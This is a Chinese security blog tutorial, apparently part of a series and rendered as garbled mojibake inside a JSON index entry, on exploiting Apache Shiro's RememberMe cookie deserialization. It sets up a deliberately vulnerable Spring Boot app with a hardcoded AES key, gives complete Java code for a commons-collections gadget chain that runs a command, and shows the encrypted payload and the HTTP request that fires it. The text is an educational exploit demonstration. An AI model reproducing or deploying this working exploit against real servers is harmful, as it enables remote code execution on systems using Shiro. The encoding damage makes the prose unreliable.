ç²¾é™„ä½“çš„æœ‹å‹è¯´æˆ‘ä¸ŠèŠ‚å†™çš„é‚£ä¸ªæ¥å£åœ¨ç°å®ç¯å¢ƒä¸­åŸºæœ¬ä¸Šä¸ä¼šæœ‰ï¼Œé‚£æˆ‘ä»¬ä»Šå¤©æ¥ä»‹ç»ä¸€ä¸ªä½¿ç”¨å¹¿æ³›çš„æ¡†æ¶ shiroã€‚\nshiro çš„ RememberMe åŠŸèƒ½å°±æ˜¯åˆ©ç”¨äº† Java çš„ååºåˆ—åŒ–æ¥å®ç°çš„ï¼Œä¸è¿‡å®ƒå¹¶ä¸æ˜¯ç›´æ¥å°†å¯¹è±¡åºåˆ—åŒ–æˆæ•°ç»„åç®€å•ä½¿ç”¨ base64 ç¼–ç å°±å†™å…¥åˆ° Cookie ä¸­ï¼Œè€Œæ˜¯å°†å¯¹è±¡å­—èŠ‚æ•°ç»„è¿›è¡Œäº†ä¸€æ¬¡ AES åŠ å¯†ï¼Œæœ€åæ‰ base64 ç¼–ç å†™å…¥åˆ° Cookie ä¸­ã€‚\nä»¥æœ€æ–°ç‰ˆ shiro 1.8.0 ä¸ºä¾‹ï¼Œ org.apache.shiro.mgt.AbstractRememberMeManager çš„ onSuccessfulLogin æ–¹æ³•ä¸­ï¼Œå½“æ‰“å¼€ RememberMe åä¼šè°ƒç”¨ rememberIdentity æ–¹æ³•\npublic void onSuccessfulLogin(Subject subject, AuthenticationToken token, AuthenticationInfo info) { //always clear any previous identity: forgetIdentity(subject); //now save the new identity: if (isRememberMe(token)) { rememberIdentity(subject, token, info); } else { if (log.isDebugEnabled()) { log.debug(\u0026#34;AuthenticationToken did not indicate RememberMe is requested. \u0026#34; + \u0026#34;RememberMe functionality will not be executed for corresponding account.\u0026#34;); } } } rememberIdentity æ–¹æ³•å¦‚ä¸‹ï¼š\npublic void rememberIdentity(Subject subject, AuthenticationToken token, AuthenticationInfo authcInfo) { // ç”Ÿæˆèº«ä»½è®¤è¯ä¿¡æ¯ PrincipalCollection principals = getIdentityToRemember(subject, authcInfo); // å®ç°è®°ä½ç™»å½• rememberIdentity(subject, principals); } rememberIdentity æ–¹æ³•å¦‚ä¸‹ï¼š\nprotected void rememberIdentity(Subject subject, PrincipalCollection accountPrincipals) { // å°†èº«ä»½è®¤è¯ä¿¡æ¯åºåˆ—åŒ–ä¸ºå­—èŠ‚æ•°ç»„ byte[] bytes = convertPrincipalsToBytes(accountPrincipals); // å°†å­—èŠ‚æ•°ç»„å†™å…¥åˆ°Cookieä¸­ rememberSerializedIdentity(subject, bytes); } convertPrincipalsToBytes æ–¹æ³•å¦‚ä¸‹ï¼š\nprotected byte[] convertPrincipalsToBytes(PrincipalCollection principals) { // å°†èº«ä»½è®¤è¯ä¿¡æ¯åºåˆ—åŒ–ä¸ºå­—èŠ‚æ•°ç»„ï¼Œæœ€ç»ˆä¼šè°ƒç”¨ DefaultSerializer çš„ serialize æ–¹æ³• byte[] bytes = serialize(principals); if (getCipherService() != null) { // å¦‚æœåŠ å¯†æœåŠ¡å­˜åœ¨åˆ™è¿›è¡Œä¸€æ¬¡AESåŠ å¯†ï¼Œåœ¨åŠ å¯†æ—¶ä¼šä½¿ç”¨å½“å‰è®¾ç½®çš„å¯†é’¥ bytes = encrypt(bytes); } return bytes; } rememberSerializedIdentity æ–¹æ³•å¦‚ä¸‹ï¼š\nprotected void rememberSerializedIdentity(Subject subject, byte[] serialized) { if (!WebUtils.isHttp(subject)) { if (log.isDebugEnabled()) { String msg = \u0026#34;Subject argument is not an HTTP-aware instance. This is required to obtain a servlet \u0026#34; + \u0026#34;request and response in order to set the rememberMe cookie. Returning immediately and \u0026#34; + \u0026#34;ignoring rememberMe operation.\u0026#34;; log.debug(msg); } return; } HttpServletRequest request = WebUtils.getHttpRequest(subject); HttpServletResponse response = WebUtils.getHttpResponse(subject); //base 64 encode it and store as a cookie: String base64 = Base64.encodeToString(serialized); Cookie template = getCookie(); //the class attribute is really a template for the outgoing cookies Cookie cookie = new SimpleCookie(template); cookie.setValue(base64); cookie.saveTo(request, response); } æœ€ç»ˆä¼šå°†èº«ä»½è®¤è¯ä¿¡æ¯å†™å…¥åˆ° Cookie ä¸­ã€‚\nååºåˆ—åŒ–çš„è¿‡ç¨‹ç±»ä¼¼ï¼Œä¸è¿‡æ˜¯æŠŠè¿™ä¸ªæµç¨‹åè¿‡æ¥ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥å¾—å‡ºä¸€ä¸ªç»“è®ºã€‚\nåªè¦ç›®æ ‡ç³»ç»Ÿä¸­åŒæ—¶æœ‰ä½¿ç”¨ shiro å’Œ commons-collections 3.1ï¼Œå¹¶ä¸”åœ¨å¾—çŸ¥äº†AESå¯†é’¥ï¼Œå³å¯è§¦å‘è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚\n0x01 æ­å»ºæµ‹è¯•ç¯å¢ƒ æˆ‘ä»¬ä½¿ç”¨ springboot æ­å»ºä¸€ä¸ªæµ‹è¯•ç¯å¢ƒã€‚\nä½¿ç”¨ maven åˆ›å»ºå¥½ä¸€ä¸ªåŒ…å« web çš„ springboot é¡¹ç›®åï¼Œåœ¨ pom.xml å¢åŠ ä¸¤ä¸ªä¾èµ–ï¼š\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;commons-collections\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-collections\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.2.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.shiro\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;shiro-spring-boot-web-starter\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.8.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; ç„¶åå¢åŠ ä¸¤ä¸ªç±»é…ç½® shiro ã€‚\nimport org.apache.shiro.realm.Realm; import org.apache.shiro.realm.text.TextConfigurationRealm; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; @Configuration public class ShiroRealmConfig { @Bean public Realm realm() { TextConfigurationRealm realm = new TextConfigurationRealm(); // é…ç½®è´¦æˆ·ä¿¡æ¯ realm.setUserDefinitions(\u0026#34;user=password,user\\n\u0026#34; + \u0026#34;admin=password,admin\u0026#34;); realm.setRoleDefinitions(\u0026#34;admin=read,write\\n\u0026#34; + \u0026#34;user=read\u0026#34;); realm.setCachingEnabled(true); return realm; } } import org.apache.shiro.mgt.SecurityManager; import org.apache.shiro.web.mgt.CookieRememberMeManager; import org.apache.shiro.web.mgt.DefaultWebSecurityManager; import org.springframework.context.annotation.Configuration; import javax.annotation.PostConstruct; import javax.annotation.Resource; import java.util.Base64; @Configuration public class ShiroSecurityConfig { @Resource private SecurityManager securityManager; @PostConstruct public void init() { // é…ç½®è®°ä½ç™»å½•ç®¡ç†å™¨ï¼Œå¹¶ä¸”è®¾ç½® AES åŠ å¯†çš„ key CookieRememberMeManager cookieRememberMeManager = new CookieRememberMeManager(); cookieRememberMeManager.setCipherKey(Base64.getDecoder().decode(\u0026#34;zSyK5Kp6PZAAjlT+eeNMlg==\u0026#34;)); ((DefaultWebSecurityManager) securityManager).setRememberMeManager(cookieRememberMeManager); } } æœ€åå¯åŠ¨é¡¹ç›®ã€‚\n0x02 ç”Ÿæˆ payload import cn.typesafe.jsv.util.Serializer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import org.apache.shiro.crypto.AesCipherService; import org.apache.shiro.util.ByteSource; import javax.management.BadAttributeValueExpException; import java.lang.reflect.Field; import java.util.Base64; import java.util.HashMap; import java.util.Map; public class Exp5 { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[2]), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}) }; Transformer transformerChain = ChainedTransformer.getInstance(transformers); // åœ¨è°ƒç”¨ get æ–¹æ³•æ—¶ä¼ å…¥ä¸€ä¸ªä¸å­˜åœ¨çš„ key æ—¶ä¼šè°ƒç”¨ Transformer çš„ transform æ–¹æ³• Map lazyMap = LazyMap.decorate(new HashMap(), transformerChain); // åœ¨è°ƒç”¨ toString æ–¹æ³•æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨ getValue æ–¹æ³•å¹¶ä½¿ç”¨ æ„é€ æ–¹æ³•ä¼ å…¥çš„ key å½“ä½œ key TiedMapEntry entry = new TiedMapEntry(lazyMap, \u0026#34;foo\u0026#34;); // åˆ›å»ºBadAttributeValueExpExceptionå¯¹è±¡ï¼Œç±»å‹æ˜¯ public çš„ï¼Œæ— éœ€ä½¿ç”¨åå°„åˆ›å»º BadAttributeValueExpException obj = new BadAttributeValueExpException(null); // æˆå‘˜ val æ²¡æœ‰setVal æ–¹æ³•ï¼Œåªèƒ½é€šè¿‡åå°„ä¿®æ”¹ Field valField = obj.getClass().getDeclaredField(\u0026#34;val\u0026#34;); valField.setAccessible(true); valField.set(obj, entry); /*-----------------------ä»¥ä¸‹æ˜¯åºåˆ—åŒ–å’Œååºåˆ—åŒ–æµ‹è¯•----------------------------*/ final byte[] bytes = Serializer.serialize(obj); byte[] key = Base64.getDecoder().decode(\u0026#34;zSyK5Kp6PZAAjlT+eeNMlg==\u0026#34;); // åˆ›å»ºä¸€ä¸ª shiro çš„ AES åŠ å¯†æœåŠ¡ç±» AesCipherService aesCipherService = new AesCipherService(); // ä½¿ç”¨ AES åŠ å¯†åºåˆ—åŒ–åçš„å­—èŠ‚æ•°ç»„ ByteSource encrypt = aesCipherService.encrypt(bytes, key); // å°†åŠ å¯†åçš„å­—èŠ‚æ•°ç»„è½¬æ¢ä½¿ç”¨ Base64 ç¼–ç åè¾“å‡º String encoder = Base64.getEncoder().encodeToString(encrypt.getBytes()); System.out.println(\u0026#34;åºåˆ—åŒ–å+AESåŠ å¯†+base64 encodeï¼š\u0026#34; + encoder); /*// ä½¿ç”¨Base64 è§£ç å­—ç¬¦ä¸²ä¸ºå­—èŠ‚æ•°ç»„ï¼Œ å¹¶ä½¿ç”¨AES è§£å¯†å­—èŠ‚æ•°ç»„ ByteSource decrypt = aesCipherService.decrypt(Base64.getDecoder().decode(encoder), key); // ååºåˆ—åŒ–ä¸ºå¯¹è±¡ final Object o = Serializer.deserialize(decrypt.getBytes()); System.out.println(\u0026#34;ååºåˆ—åŒ–+AESè§£å¯†+base64 decodeï¼š\u0026#34; + o);*/ } } è¿è¡Œåè¾“å‡ºï¼š\nåºåˆ—åŒ–å+AESåŠ å¯†+base64 encodeï¼š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 å†’å·åé¢çš„å°±æ˜¯æˆ‘ä»¬éœ€è¦çš„ payloadã€‚\n0x03 ä¸€å‘å…¥é­‚ æˆ‘è¿™é‡Œè¿˜æ˜¯ä½¿ç”¨ IDEA è‡ªå¸¦çš„å·¥å…·è¿›è¡Œæµ‹è¯•ã€‚\næ–°å»ºä¸€ä¸ª poc.http æ–‡ä»¶å†™å…¥ä¸€ä¸‹å†…å®¹\nGET http://localhost:8080/ Cookie: JSESSIONID=x; rememberMe=8dlbzft11MsVfuSNNEJEVWaLQG6NbN4J+RCWkAoWRt5uCU9hQrw9hB8GM8znqBiVM0seFD9fpJobn8aRQZrTu+gF/gWXL4TRAfOWxJAxEESjBDP9H0mfU/ZLu4qzi0AQ4sWKEB1RiIiaYc41HtQqn7b5hNpGHInGVsF5Z4ZKKEvlVKXghjJMU0IW57sAnhwSZgia7HExu947n5doszR8t5Y9d3VtqoH1vxncMtB7X1xCdsttxov/bf7hrAwe8reDDaAYssEcJGUv2tTY1YUGYztsSmyZFenk/KfeN0wUbyhBCjCsCQB/gpbbsj+oB4CZv9sP8FToiCJhzld5rZE95HXenWJOy5r0h8CVlmlWBuXDKHJV94z18w3CJLIPGxTjOWE8wIboZBSahG1kOQd+qnn9aFhM2m0TnnpSy71yAZlGgZplWd0XKsjXGssgx/3Cxz6FJJhnPw/SH05jexO6lGlXQY6PBWn3HMzJySbfoz1O1wu/XtbU4rUT2pSBvr5EiRrMHpGlkh8NVHqCwX0eeFMYGLZipwFns7/y2e4UVkTJUUPcleKj69jVCf4aSkZx5qvK/9kTOV4s+NK3qPfW96rjh7t61iGlfaav5HpvA/UB8fcJU0K5juphx6V/8s871udQIvZtxa72+QIevoMzA/ld8CPBDtADHr5JlLkVTanfjFjwvzH+tqQku5S1TzJtXubqlV8QAXVCCM/M+cxvt6Xy+ctmovxfpJcbZ7I0S/zhgMHEaBPRRTw/66IwI3nikpdnC0ZYJ1gpNKLDxlgs4bEL4QLFFvPLMJLFSFF/7bLJ6XTTX035E0+gUAvU0n1nCNLCndLQVROROlcUMso9l9mdkGWxvGoDzI2JqAcZh6PfohVshD9DZhQsPRJ//4IBXIjdxC9wbrnyLRjM9NetEQbMcl0r3euXpgybuWqiA8oEuD2/jSbqyRFI/7lkDmDUue3fWmLr/BkLRLPWMyb7OwZv/vr+xy6wVweK+eUGIrba2XJFFc2zJynn+Q/K/rj2fIsRAwL1ufCngiOpXBMtDkUrkw0htRKGSCweGENLH4177nEyEgEBFI0ozFyeZmLWAIv2mdTYRvz+eaao1wgSBfW6oVSbcQeW2u1Py1hENdD+ntNiSjj46Grgug7VcNtvgYXrXRzZSUjlTCyqlqYsgY07Uk4PoxzSFw39h4rVeB5eaaR49BPSplB3Rt6Q2b7eypMF+7AmwttCglSi99S6VqRlgG7fim1dXTxeXkxpd1ghvf8USu8MofIusgEnw+gxwEtSDzQnhuNHn6AOys/wPNxeSn5Rqe/2CKVfUS53aFQr498sNX6yTqFF2n6tpYCscWPQEA7il3KLpcOWGlSaPYrWm/PpWuXp3vYUOBEzwC7yGmhJvHaxyymW5P2bZOYAUaT8SEZk1n9vgfKCIDIuQSE8IXwMx1lH7RF8AoohTVoL+8ZszVYWfXg6x7/N3n5V8SxGO5XKMPOMJVQLN6vFlMaSwB85jf0WxnoDt0t+7OgaiVazyuUii1ZLz9zUnnhkpDCM2tcAxI1riYwZhWhjHbMA4wu/COPTWJgMgfGOUiP+75yqWx8og+5AC/5FVw50z5tGPzA9Goy/SfNccHqHCrJF1r4lCVovmAizVeIhvfwx5silsro+wtwMw5E//i7KgWTpjMK4lBfTN48sxDqbaY1az6HTioEB+/76wcKiMAI6rEZSQHtEnvXOyP6m82xHPYf8BtDYtopbz993WOwCtkJ4UOjqyK8Z64rgJ3bJbaXFrQ860sG31fyTpiB4CF+dZkveGQLD/lOKlC2fpYTIg8hxiD0vYux4UF//cEfH385JywsGUp8Q/DHQg2BpT/fRL2NRH1LYjuNpsdtURoRHLgkZRnCFk3gjYpqR/NswlomcC+G8W73+8FY1UKnI3GW8skks02oTvZRq6u3vaixSAivxUOBJatp+8iYEeJ7GnSbIQoGELL1wgjWKnRq+rpf4don490cF0tza5A3syc1InIC5SAva+WjFhaZFnEqvEya1FxBEcjLslmU4Nud3RDJkKV/OU/CVpMUvVJC+jAJt3UYYkEFEW1yqphGZ325bl9yhIhOm8azCh6MXSt29B2FfZZMKoa1ybgQ9w4K8rnLNezwvazFCWNiqi/PJo7c74GJvfr+U5Bnd5Op97FMSgwrqh24ECeofEtRYv7dznH33HG4wDrJkeJqVjEeKx1xOTuQwXq1Z0hb5AwQYZWoY5fbgZlh85pKIt8oAV7Rsj/ZUC3wQ8jT+izYqL7taETFF3W5lyj/yvy7N7YPT3CurBhjibaWs67y9jIKuKzEWTIRIbS7euEgJbO3FZrLkX1zhZsbRf5ZReicQAhoDEx+hDIL4joUP+pw6d9kK4/Q3uJAVkkqBoaxmaQU4mP7DrzhHg8O8u/aSxDLncO/zlzlRVshURGprPaF7lQzgtjE3dSNJ7NvBP64rpMQvoB0yGgSOogKc ç‚¹å‡»å‘é€è¯·æ±‚ï¼Œä¾¿å¯ä»¥çœ‹åˆ°æœ¬åœ°è®¡ç®—æœºæ‰“å¼€äº†è®¡ç®—å™¨ç¨‹åºã€‚\næ³¨ æ–‡ä¸­æµ‹è¯•ä½¿ç”¨ç³»ç»Ÿå’Œå·¥å…·ç‰ˆæœ¬å¦‚ä¸‹ï¼š\næ“ä½œç³»ç»Ÿ windows 10 20H2 jdk java 1.8.0_301 springboot 2.5.5 commons-collections 3.1 shiro 1.8.0 ä»£ç ä»“åº“ https://github.com/dushixiang/java-serialization-vulnerability å…¶ä»– ç»è¿‡æµ‹è¯• commons-collections 3.2.1 ç‰ˆæœ¬åŒæ ·å¯ä»¥å¤ç°ä¸Šè¿°é—®é¢˜ï¼Œcommons-collections 3.2.2 ä¸å¯å¤ç°ã€‚\nå‚è€ƒ https://github.com/frohoff/ysoserial\n","permalink":"https://www.typesafe.cn/posts/java-serialization-vulnerability-2/","summary":"\u003ch2 id=\"å£°æ˜\"\u003eå£°æ˜\u003c/h2\u003e\n\u003cp\u003eæœ¬æ–‡ç« ä¸­æ‰€æœ‰å†…å®¹ä»…ä¾›å­¦ä¹ äº¤æµï¼Œä¸¥ç¦ç”¨äºéæ³•ç”¨é€”ï¼Œå¦åˆ™ç”±æ­¤äº§ç”Ÿçš„ä¸€åˆ‡åæœå‡ä¸ä½œè€…æ— å…³ã€‚\u003c/p\u003e\n\u003ch2 id=\"æ–°çš„å¸Œæœ›\"\u003eæ–°çš„å¸Œæœ›\u003c/h2\u003e\n\u003ch3 id=\"0x00\"\u003e0x00\u003c/h3\u003e\n\u003cp\u003eåœ¨ä¸Šä¸€èŠ‚ä¸­æˆ‘ä»¬ä»‹ç»äº† Java ååºåˆ—åŒ–æ¼æ´çš„æˆå› å’Œåˆ©ç”¨ \u003ccode\u003ecommons-collections 3.1\u003c/code\u003e æ­é… \u003ccode\u003esun.reflect.annotation.AnnotationInvocationHandler\u003c/code\u003e å®ç°è¿œç¨‹å‘½ä»¤æ‰§è¡Œçš„æ–¹å¼ã€‚ä½†\u003ccode\u003esun.reflect.annotation.AnnotationInvocationHandler\u003c/code\u003e çš„é—®é¢˜å·²ç»åœ¨æœ€æ–°ç‰ˆ jdk ä¸­ä¿®å¤ï¼Œå¯åˆ©ç”¨èŒƒå›´ä»…èƒ½å¤Ÿå±€é™äºæ—§ç‰ˆæœ¬çš„jdkã€‚ç»è¿‡å®‰å…¨äººå‘˜çš„å®¡è®¡ï¼Œå¦ä¸€ä¸ªç±»  \u003ccode\u003ejavax.management.BadAttributeValueExpException\u003c/code\u003e å‡ºç°åœ¨äº†å®‰å…¨äººå‘˜çš„è§†é‡ã€‚\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ejavax.management.BadAttributeValueExpException\u003c/code\u003e ç»§æ‰¿è‡ª \u003ccode\u003ejava.lang.Exception\u003c/code\u003eï¼Œ\u003ccode\u003ejava.lang.Exception\u003c/code\u003e ç»§æ‰¿è‡ª \u003ccode\u003ejava.lang.Throwable\u003c/code\u003eï¼Œè€Œ \u003ccode\u003ejava.lang.Throwable\u003c/code\u003e å®ç°äº† \u003ccode\u003ejava.io.Serializable\u003c/code\u003eã€‚å› æ­¤ \u003ccode\u003ejavax.management.BadAttributeValueExpException\u003c/code\u003e ç¬¦åˆäº† \u003cstrong\u003eå¯åºåˆ—åŒ–\u003c/strong\u003e è¿™ä¸ªè¦æ±‚ï¼ŒåŒæ ·çš„å®ƒä¹Ÿå¢åŠ äº† \u003ccode\u003ereadObject\u003c/code\u003e æ–¹æ³•ï¼Œè¿™ä¸ªç±»çš„å®Œæ•´ä»£ç å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-java\" data-lang=\"java\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e javax.management;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e java.io.IOException;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e java.io.ObjectInputStream;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e/**\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e * Thrown when an invalid MBean attribute is passed to a query\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e * constructing method.  This exception is used internally by JMX\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e * during the evaluation of a query.  User code does not usually\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e * see it.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e *\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e * @since 1.5\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003epublic\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eclass\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eBadAttributeValueExpException\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eextends\u003c/span\u003e Exception   {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e/* Serial version */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eprivate\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estatic\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efinal\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003elong\u003c/span\u003e serialVersionUID \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e3105272988410493376L;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e/**\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e     * @serial A string representation of the attribute that originated this exception.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e     * for example, the string value can be the return of {@code attribute.toString()}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e     */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eprivate\u003c/span\u003e Object val;\n\u003c/span\u003e\u003c/span\u003e\u003cspan 